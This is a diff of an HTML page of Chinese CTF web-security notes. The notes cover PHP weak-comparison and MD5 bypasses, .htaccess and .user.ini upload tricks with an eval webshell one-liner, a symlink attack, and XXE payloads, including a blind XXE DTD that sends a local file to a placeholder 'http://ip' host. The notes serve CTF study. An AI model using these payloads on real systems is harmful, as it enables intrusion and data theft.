@@ -470,27 +470,26 @@
         
         <div class="entry-content">
           <p>ctrl+shift+c 打开禁用f12的网页的devtools</p>
-<h1 id="注意-index-php-重定向，打开网页都是访问index文件"><a href="#注意-index-php-重定向，打开网页都是访问index文件" class="headerlink" title="注意 &#x2F;index.php 重定向，打开网页都是访问index文件"></a>注意 &#x2F;index.php 重定向，打开网页都是访问index文件</h1><p><a href="https://www.nssctf.cn/problem/958">题</a></p>
-<h1 id="0要时刻注意-robots-txt-www-zip-等"><a href="#0要时刻注意-robots-txt-www-zip-等" class="headerlink" title="0要时刻注意&#x2F;robots.txt www.zip 等"></a>0要时刻注意&#x2F;robots.txt <a href="http://www.zip/">www.zip</a> 等</h1><h1 id="科学计数法和MD5值sha1值比较"><a href="#科学计数法和MD5值sha1值比较" class="headerlink" title="科学计数法和MD5值sha1值比较"></a>科学计数法和MD5值sha1值比较</h1><h2 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h2><p>php 对<code>0e+纯数字</code>当作科学计数法而绕过<br>以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0</p>
-<pre><code class="txt">
+<h1 id="注意-index-php-重定向，打开网页都是访问index文件"><a href="#注意-index-php-重定向，打开网页都是访问index文件" class="headerlink" title="注意 /index.php 重定向，打开网页都是访问index文件"></a>注意 /index.php 重定向，打开网页都是访问index文件</h1><p><a href="https://www.nssctf.cn/problem/958">题</a></p>
+<h1 id="0要时刻注意-robots-txt-www-zip-等"><a href="#0要时刻注意-robots-txt-www-zip-等" class="headerlink" title="0要时刻注意/robots.txt www.zip 等"></a>0要时刻注意/robots.txt www.zip 等</h1><h1 id="科学计数法和MD5值sha1值比较"><a href="#科学计数法和MD5值sha1值比较" class="headerlink" title="科学计数法和MD5值sha1值比较"></a>科学计数法和MD5值sha1值比较</h1><h2 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h2><p>php 对<code>0e+纯数字</code>当作科学计数法而绕过<br>以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0</p>
+<pre><code class="lang-txt">
 s1502113478a
 0e861580163291561247404381396064
-  
+
 s1885207154a
 0e509367213418206700842008763514
-  
+
 s1836677006a
 0e481036490867661113260034900752
-  
+
 s155964671a
 0e342768416822451524974117254469
-  
+
 s1184209335a
 0e072485820392773389523109082030
 
 0e215962017
 0e291242476940776845150308577824
-  
 </code></pre>
 <h2 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h2><pre><code>二进制md5加密 8e4ef6c69a337c0de0208455ee69a416
 
@@ -501,34 +500,32 @@ url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
 二进制md5加密 8e4ef6c69a337c0de0208455ee69a416
 
 url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0
-</code></pre>
-<p>对于<code>sha1</code>强碰撞基本不可能，但sha1函数传入为数组时会返回<code>flase</code>,两个flase会相等<br><a href="https://www.nssctf.cn/problem/2296">[极客大挑战 2020]welcome</a></p>
+</code></pre><p>对于<code>sha1</code>强碰撞基本不可能，但sha1函数传入为数组时会返回<code>flase</code>,两个flase会相等<br><a href="https://www.nssctf.cn/problem/2296">[极客大挑战 2020]welcome</a></p>
 <p>pyload:</p>
 <pre><code>roam1[]=1&amp;roam2[]=2
-</code></pre>
-<h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>md5() 函数中如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null&#x3D;null为 True 绕过</p>
-<pre><code class="url">str1[]=1&amp;str2[]=2
+</code></pre><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>md5() 函数中如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为 True 绕过</p>
+<pre><code class="lang-url">str1[]=1&amp;str2[]=2
 </code></pre>
 <h1 id="科学计数法比较大小"><a href="#科学计数法比较大小" class="headerlink" title="科学计数法比较大小"></a>科学计数法比较大小</h1><p>web中三位数最大的数不是<code>999</code>而是<code>9e9</code></p>
 <h1 id="strcmp函数问题"><a href="#strcmp函数问题" class="headerlink" title="strcmp函数问题"></a>strcmp函数问题</h1><p>函数问题见<code>ctf-php-常用函数及其绕过</code></p>
 <h1 id="NULL、0、”0”、array-、字母、进制的比较"><a href="#NULL、0、”0”、array-、字母、进制的比较" class="headerlink" title="NULL、0、”0”、array()、字母、进制的比较"></a>NULL、0、”0”、array()、字母、进制的比较</h1><p><code>NULL</code>、<code>0</code>、<code>&quot;0&quot;</code>、<code>array()</code>在弱比较时相等、</p>
 <h2 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h2><p>字符串以数字开头时，以开头数字（到字母出现截止）作为转换结果；开头不是数字的字符串或空<code>null</code>，则转换为<code>0</code></p>
-<pre><code class="php">&#39;12&#39;==12    //true
+<pre><code class="lang-php">&#39;12&#39;==12    //true
 &#39;12abc&#39;==12 //true
 &#39;adm2n&#39;==0  //true
 </code></pre>
 <h2 id="进制格式的字符串"><a href="#进制格式的字符串" class="headerlink" title="进制格式的字符串"></a>进制格式的字符串</h2><p>在弱比较下会将其转换为数字</p>
 <h1 id="超过精度的弱类型问题"><a href="#超过精度的弱类型问题" class="headerlink" title="超过精度的弱类型问题"></a>超过精度的弱类型问题</h1><h2 id="浮点判断"><a href="#浮点判断" class="headerlink" title="浮点判断"></a>浮点判断</h2><p>超过精度的数字（小数点后超过17位）在进行弱口令比较时，会出现相等的情况</p>
-<pre><code class="php">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE
+<pre><code class="lang-php">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE
 var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE
 </code></pre>
-<h2 id="浮点运算问题"><a href="#浮点运算问题" class="headerlink" title="浮点运算问题"></a>浮点运算问题</h2><pre><code class="php">&lt;?php
+<h2 id="浮点运算问题"><a href="#浮点运算问题" class="headerlink" title="浮点运算问题"></a>浮点运算问题</h2><pre><code class="lang-php">&lt;?php
 $f =0.58;
 var_dump(intval($f*100));
 ?&gt;
 </code></pre>
 <p>output</p>
-<pre><code class="txt">int(57)
+<pre><code class="lang-txt">int(57)
 </code></pre>
 <p>在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值</p>
 <p>具体详细的原理可以看这位<a href="http://www.haodaquan.com/12">师傅</a>的描述</p>
@@ -536,15 +533,15 @@ var_dump(intval($f*100));
 <p>脚本文件要被访问后才有机会执行其中的恶意指令</p>
 <h2 id="htaccess-上传漏洞"><a href="#htaccess-上传漏洞" class="headerlink" title=".htaccess 上传漏洞"></a>.htaccess 上传漏洞</h2><p><a href="https://www.nssctf.cn/problem/1094">题</a></p>
 <p>使<code>jpg</code>当做<code>php</code>解析</p>
-<pre><code class="text">AddType application/x-httpd-php .jpg
+<pre><code class="lang-text">AddType application/x-httpd-php .jpg
 </code></pre>
 <p>可能会判断<code>&lt;?php&gt;</code><br>来一个没有标志的一句话</p>
-<pre><code class="php">GIF89a
+<pre><code class="lang-php">GIF89a
 &lt;script language=&#39;php&#39;&gt;@eval($_POST[&quot;a&quot;]);&lt;/script&gt;
 </code></pre>
 <h2 id="user-ini-上传漏洞"><a href="#user-ini-上传漏洞" class="headerlink" title=".user.ini 上传漏洞"></a>.user.ini 上传漏洞</h2><p><code>.htaccess</code> 只适用于<code>apache</code></p>
-<p>而<code>apache</code>&#x2F;<code>nginx</code>&#x2F;<code>iis</code>都会用到</p>
-<pre><code class="txt">
+<p>而<code>apache</code>/<code>nginx</code>/<code>iis</code>都会用到</p>
+<pre><code class="lang-txt">
 GIF89a
 auto_prepend_file=tupianmaplus.png
 </code></pre>
@@ -555,7 +552,7 @@ auto_prepend_file=tupianmaplus.png
 <p>不要尝试解压，而是用winrar打开或者改成<code>.rar</code></p>
 <h1 id="上传解压接口软链接覆盖问题-软链接攻击"><a href="#上传解压接口软链接覆盖问题-软链接攻击" class="headerlink" title="上传解压接口软链接覆盖问题(软链接攻击)"></a>上传解压接口软链接覆盖问题(软链接攻击)</h1><p>例题:hgame2024 week 3 ZeroLink </p>
 <p>特点:上传一个zip压缩包，程序会进行解压，指定要读取的文件名，文件内容将被返回至网页(或者存在读取接口)。</p>
-<pre><code class="shell">
+<pre><code class="lang-shell">
 //软链接
 ln -s /app she
 
@@ -575,15 +572,14 @@ vim she/secret
 <pre><code>arjun -u http://node5.anna.nssctf.cn:28659/ -c 100 -d 5
 
 -d 是发包间隔，秒为单位
-</code></pre>
-<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><a href="https://xz.aliyun.com/t/3357">文章</a></p>
-<h2 id="有回显XXE"><a href="#有回显XXE" class="headerlink" title="有回显XXE"></a>有回显XXE</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+</code></pre><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><a href="https://xz.aliyun.com/t/3357">文章</a></p>
+<h2 id="有回显XXE"><a href="#有回显XXE" class="headerlink" title="有回显XXE"></a>有回显XXE</h2><pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
 &lt;!DOCTYPE creds [  
 &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
 &lt;creds&gt;&amp;goodies;&lt;/creds&gt;
 </code></pre>
 <p>如果其中含有特殊字符，则需要CDATA拼接</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+<pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
 &lt;!DOCTYPE roottag [
 &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
 &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
@@ -594,26 +590,26 @@ vim she/secret
 &lt;roottag&gt;&amp;all;&lt;/roottag&gt;
 </code></pre>
 <p>evil.dtd</p>
-<pre><code class="xml">
+<pre><code class="lang-xml">
 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
 &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
 </code></pre>
 <p>无回显xxe</p>
 <p>test.dtd</p>
-<pre><code class="xml">
+<pre><code class="lang-xml">
 &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
 &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;
 </code></pre>
 <p>payload</p>
-<pre><code class="xml">&lt;!DOCTYPE convert [ 
+<pre><code class="lang-xml">&lt;!DOCTYPE convert [ 
 &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
 %remote;%int;%send;
 ]&gt;
 </code></pre>
-<p>各xml处理支持的协议<br><img src="https://i0.hdslb.com/bfs/article/5a9838814ec36d7275acb8fa9e768dcb290349942.png"></p>
+<p>各xml处理支持的协议<br><img src="https://i0.hdslb.com/bfs/article/5a9838814ec36d7275acb8fa9e768dcb290349942.png" alt=""></p>
 <h1 id="PHP随机数预测"><a href="#PHP随机数预测" class="headerlink" title="PHP随机数预测"></a>PHP随机数预测</h1><p>使用php_mt_seed</p>
 <p>php_mt_seed能识别的格式<code>match_min matchmax 0 range_max</code></p>
-<p><img src="https://i0.hdslb.com/bfs/article/bb2310e924d13567478a5abdf7566fff290349942.png"></p>
+<p><img src="https://i0.hdslb.com/bfs/article/bb2310e924d13567478a5abdf7566fff290349942.png" alt=""></p>
 
         </div>
         <!-- .entry-content -->
